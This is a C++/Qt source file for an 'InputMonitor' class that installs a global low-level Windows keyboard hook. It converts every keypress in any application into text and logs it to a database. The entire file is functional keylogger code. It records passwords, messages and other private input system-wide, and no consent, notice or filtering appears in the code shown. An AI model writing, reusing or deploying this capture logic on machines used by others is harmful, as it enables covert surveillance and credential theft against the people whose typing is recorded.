#include "inputmonitor.h"
#include "databasemanager.h"
#include <QString>
#include <QDebug>

InputMonitor::InputMonitor(QObject *parent) : QObject(parent), m_hKeyboardHook(NULL) {}

void InputMonitor::start() {
    if (!m_hKeyboardHook) {
        m_hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
        if (!m_hKeyboardHook) {
            qDebug() << "Failed to install keyboard hook!";
        }
    }
}

void InputMonitor::stop() {
    if (m_hKeyboardHook) {
        UnhookWindowsHookEx(m_hKeyboardHook);
        m_hKeyboardHook = NULL;
    }
}

LRESULT CALLBACK InputMonitor::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyBoard->vkCode;

        BYTE keyboardState[256];
        for (int i = 0; i < 256; i++) {
            keyboardState[i] = (BYTE)(GetKeyState(i) & 0x8000);
        }

        wchar_t buffer[5];
        int result = ToUnicode(vkCode, pKeyBoard->scanCode, keyboardState, buffer, 4, 0);

        QString keyText;
        if (result > 0) {
            keyText = QString::fromWCharArray(buffer, result);
        } else {
            if (vkCode == VK_SPACE) keyText = " [SPACE] ";
            else if (vkCode == VK_RETURN) keyText = " [ENTER]\n";
            else if (vkCode == VK_BACK) keyText = " [BACKSPACE] ";
            else keyText = QString(" [Key:%1] ").arg(vkCode);
        }

        DatabaseManager::instance()->logKey(keyText);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
